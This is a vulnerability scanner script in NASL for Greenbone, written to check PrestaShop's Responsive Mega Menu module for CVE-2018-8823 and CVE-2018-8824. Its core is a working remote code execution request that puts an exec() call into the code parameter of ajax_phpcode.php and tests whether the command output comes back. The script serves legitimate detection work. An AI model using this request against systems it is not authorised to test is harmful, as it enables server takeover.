CPE = "cpe:/a:prestashop:prestashop";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.144185" );
	script_version( "2021-07-07T11:00:41+0000" );
	script_tag( name: "last_modification", value: "2021-07-07 11:00:41 +0000 (Wed, 07 Jul 2021)" );
	script_tag( name: "creation_date", value: "2020-06-30 09:08:47 +0000 (Tue, 30 Jun 2020)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-04-24 12:54:00 +0000 (Tue, 24 Apr 2018)" );
	script_cve_id( "CVE-2018-8823", "CVE-2018-8824" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_name( "PrestaShop Responsive Mega Menu Module RCE / SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2020 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_prestashop_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "prestashop/detected" );
	script_tag( name: "summary", value: "The 'Responsive Mega Menu' module for PrestaShop is prone to a remote code
  execution and SQL injection vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "modules/bamegamenu/ajax_phpcode.php in the Responsive Mega Menu
  (Horizontal+Vertical+Dropdown) Pro module 1.0.32 for PrestaShop allows remote attackers to execute an SQL
  injection or remote code execution through function calls in the code parameter." );
	script_tag( name: "affected", value: "Responsive Mega Menu (Horizontal+Vertical+Dropdown) Pro module 1.0.32 for
  PrestaShop 1.5.5.0 through 1.7.2.5." );
	script_tag( name: "solution", value: "Disable function exec(), passthru(), shell_exec(), system(), delete or edit
  the vulnerable file." );
	script_xref( name: "URL", value: "https://ia-informatica.com/it/CVE-2018-8824" );
	script_xref( name: "URL", value: "https://ia-informatica.com/it/CVE-2018-8823" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
cmds = exploit_commands();
for pattern in keys( cmds ) {
	cmd = cmds[pattern];
	url = dir + "/modules/bamegamenu/ajax_phpcode.php?code=echo%20exec%28" + cmd + "%29%3B";
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = "It was possible to execute the \"" + cmd + "\" command.\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

